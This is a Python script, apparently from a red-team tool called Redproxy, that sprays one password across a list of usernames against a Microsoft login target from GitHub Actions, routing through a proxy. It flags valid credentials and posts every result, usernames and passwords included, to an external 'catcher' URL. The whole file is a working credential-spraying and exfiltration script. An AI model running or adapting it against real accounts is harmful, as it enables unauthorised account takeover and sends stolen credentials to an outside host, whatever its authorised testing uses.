"""
Redproxy Sprayer — Microsoft target.
Runs inside GitHub Actions, sends requests through Thermoptic proxy.
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from lib.targets.microsoft import MicrosoftTarget
from lib.common import load_env_vars


def main():
    env = load_env_vars(["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"])

    usernames = env["USERNAMES"].split(",")
    password = env["PASSWORD"]
    catcher_url = env["CATCHERURL"]
    use_tls = env["CATCHERTLS"].lower() == "true"

    proxy_url = os.getenv("PROXY_URL", "http://changeme:changeme@127.0.0.1:1234")
    target = MicrosoftTarget(proxy_url=proxy_url)

    results = []
    for username in usernames:
        username = username.strip()
        if not username:
            continue

        result = target.spray(username, password)
        parsed = target.parse_response(result)

        results.append({
            "username": result.username,
            "password": result.password,
            "status_code": result.status_code,
            "response": result.response,
            "target": target.name,
            **{k: v for k, v in parsed.items() if k not in ("username", "password", "status_code")},
        })

        marker = "+" if parsed["valid_creds"] else "-"
        print(f"[{marker}] {username}: {parsed['verdict']}")

    try:
        resp = requests.post(
            catcher_url,
            json=results,
            timeout=10,
            verify=use_tls,
        )
        print(f"[+] Results sent to catcher ({len(results)} entries, HTTP {resp.status_code})")
    except requests.RequestException as e:
        print(f"[-] Failed to send to catcher: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
